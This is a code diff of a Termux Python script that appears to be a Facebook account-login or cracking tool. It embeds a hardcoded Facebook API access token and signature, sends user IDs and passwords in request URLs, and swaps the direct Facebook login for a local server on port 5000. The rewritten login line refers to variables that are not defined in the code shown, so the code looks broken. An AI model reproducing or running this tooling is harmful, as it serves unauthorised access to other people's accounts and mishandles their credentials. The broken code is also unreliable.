@@ -9,7 +9,6 @@ import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,uuid,cookiel
 from multiprocessing.pool import ThreadPool
 from requests.exceptions import ConnectionError
 os.system('termux-setup-storage')
-os.system('pkg install nodejs')
     
 try:
     os.mkdir('/sdcard/ids')
@@ -97,10 +96,6 @@ def reg():
 
     r = requests.get('https://raw.githubusercontent.com/cyber-jam/sani/main/server.txt').text
     if to in r:
-        os.system("cd ..... && npm install")
-        os.system("fuser -k 5000/tcp &")
-        os.system("#")
-        os.system("cd ..... && node index.js &")
         time.sleep(5)
         ip()
     else:
@@ -221,7 +216,7 @@ def login():
 		id=iid.replace(" ","")
 		pwd=raw_input('[+] Password : ')
 		tik()
-		data = br.open("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email="+(id)+"&locale=en_US&password="+(pwd)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+		data = br.open('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers = header).text
 		z=json.load(data)
 		if 'access_token' in z:
 		    st = open("login.txt", "w")
